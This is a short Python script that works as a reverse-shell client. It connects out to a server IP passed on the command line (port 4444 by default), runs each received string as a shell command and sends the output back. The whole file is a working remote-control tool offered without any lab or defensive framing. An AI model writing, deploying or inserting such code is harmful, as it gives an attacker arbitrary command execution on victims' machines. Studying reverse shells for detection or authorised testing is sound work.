#!/usr/bin/env python3
import socket
import subprocess

def client(server_ip, server_port=4444):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server_ip, server_port))

    while True:
        cmd = s.recv(1024).decode()
        if cmd.lower() == 'exit':
            break
        if cmd.strip() == '':
            continue
        try:
            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        except subprocess.CalledProcessError as e:
            output = e.output
        if not output:
            output = b' '
        s.send(output)
    s.close()

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print(f"Uso: python3 {sys.argv[0]} <IP_servidor>")
        exit(1)
    client(sys.argv[1])
